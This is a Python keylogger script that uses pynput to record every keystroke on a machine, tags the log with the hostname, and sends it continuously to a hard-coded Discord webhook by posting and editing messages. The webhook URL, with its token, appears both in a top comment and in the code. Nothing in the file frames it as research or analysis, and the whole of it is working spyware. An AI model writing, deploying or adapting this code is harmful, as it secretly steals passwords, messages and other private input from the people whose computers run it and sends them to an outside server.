# https://discord.com/api/webhooks/1489259979587326103/eaKCucGsJQiNfG4ED5VyUrJK_aESZWuXhdY8G1YWCMjo60oPGmNNrzwjwYWDGOUBikLB
import requests, socket, threading, time
from pynput import keyboard


def start():
    hostname = socket.gethostname()
    WEBHOOK_URL = "https://discord.com/api/webhooks/1489259979587326103/eaKCucGsJQiNfG4ED5VyUrJK_aESZWuXhdY8G1YWCMjo60oPGmNNrzwjwYWDGOUBikLB"

    buffer_lock = threading.Lock()
    key_buffer = []
    full_log = f"{hostname} keys:\n"

    message_id = None
    MAX_LEN = 1950  # safe limit under Discord's 2000 char max

    SPECIAL_KEY_NAMES = {
        keyboard.Key.shift: "",
        keyboard.Key.shift_l: "",
        keyboard.Key.shift_r: "",
        keyboard.Key.ctrl: "<CTRL>",
        keyboard.Key.ctrl_l: "<CTRL>",
        keyboard.Key.ctrl_r: "<CTRL>",
        keyboard.Key.alt: "<ALT>",
        keyboard.Key.alt_l: "<ALT>",
        keyboard.Key.alt_r: "<ALT>",
        keyboard.Key.tab: "<TAB>",
        keyboard.Key.esc: "<ESC>",
        keyboard.Key.up: "<UP>",
        keyboard.Key.down: "<DOWN>",
        keyboard.Key.left: "<LEFT>",
        keyboard.Key.right: "<RIGHT>",
        keyboard.Key.backspace: "<BACKSPACE>",
    }

    def send_new_message(content):
        """Send a new message and return its ID."""
        url = WEBHOOK_URL + "?wait=true"
        r = requests.post(url, json={"content": content})
        try:
            return r.json()["id"]
        except:
            print("Failed to create new message:", r.text)
            return None

    def edit_message(message_id, content):
        """Edit an existing message."""
        url = f"{WEBHOOK_URL}/messages/{message_id}"
        r = requests.patch(url, json={"content": content})
        if r.status_code not in (200, 204):
            print("Edit failed:", r.status_code, r.text)

    def sender_thread():
        nonlocal key_buffer, full_log, message_id

        while True:
            time.sleep(0.1)

            with buffer_lock:
                if not key_buffer:
                    continue

                # Append new keys to the full log
                full_log += "".join(key_buffer)
                key_buffer = []

            # If message is too long, start a new one
            if len(full_log) > MAX_LEN:
                # Start a brand new message with a clean header
                full_log = f"{hostname} keys (continued):\n"
                message_id = send_new_message(full_log)
                continue


            # Edit the existing message
            if message_id:
                edit_message(message_id, full_log)
            else:
                # If no message exists yet, create one
                message_id = send_new_message(full_log)

    def on_press(key):
        nonlocal key_buffer

        with buffer_lock:

            # Printable characters
            if hasattr(key, "char") and key.char:
                key_buffer.append(key.char)
                return

            # ENTER → newline
            if key == keyboard.Key.enter:
                key_buffer.append("\n")
                return

            # BACKSPACE → show readable name
            if key == keyboard.Key.backspace:
                key_buffer.append(SPECIAL_KEY_NAMES[key])
                return

            # SPACE → space
            if key == keyboard.Key.space:
                key_buffer.append(" ")
                return

            # Other special keys
            if key in SPECIAL_KEY_NAMES:
                name = SPECIAL_KEY_NAMES[key]
                if name:
                    key_buffer.append(name)
                return

            # Unknown special keys
            key_buffer.append(f"<{key}>")

    # Start with the first message
    message_id = send_new_message(full_log)

    # Start sender thread
    threading.Thread(target=sender_thread, daemon=True).start()

    # Start listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
